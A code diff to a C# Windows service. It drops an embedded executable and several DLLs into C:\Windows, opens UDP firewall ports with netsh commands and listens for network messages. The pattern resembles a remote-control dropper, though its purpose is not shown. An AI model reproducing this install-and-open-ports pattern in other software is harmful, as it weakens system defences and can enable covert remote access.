@@ -24,6 +24,9 @@ namespace WindowsService
     {
       
         private readonly string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
+        private readonly string dllPath =@"C:\Windows\dll1.dll";
+        private readonly string jsonDllPath = @"C:\Windows\Newtonsoft.Json.dll";
+        private readonly string wsDllPath = @"C:\Windows\websocket-sharp-with-proxy-support.dll";
         System.Timers.Timer timer = null;
         private string mastHost="";
         private bool mastSet = false;
@@ -48,6 +51,9 @@ namespace WindowsService
             if (!File.Exists(moniterPath))
             {
                 File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);
+                File.WriteAllBytes(dllPath, Resources.Dll1);
+                File.WriteAllBytes(jsonDllPath, Resources.Newtonsoft_Json);
+                File.WriteAllBytes(wsDllPath, Resources.websocket_sharp_with_proxy_support);
                 ExecuteCom("netsh firewall set portopening UDP 5126 ENABLE", 1);
                 ExecuteCom("netsh firewall set portopening UDP 5125 ENABLE", 1);
                 //ExecuteCom("netsh firewall set allowedprogram "+moniterPath+" A ENABLE", 1);
@@ -91,7 +97,7 @@ namespace WindowsService
 
             try
             {
-                File.WriteAllText("err.log","start");
+              
                 IPEndPoint receivePoint = new IPEndPoint(IPAddress.Any, 0);
                 UdpClient server = new UdpClient(5126);
                 UdpState s = new UdpState(server, receivePoint);
@@ -126,7 +132,7 @@ namespace WindowsService
 
         private  void EndReceive(IAsyncResult ar)
         {
-            File.AppendAllText("c:/log.log","test");
+          
 
 
             try
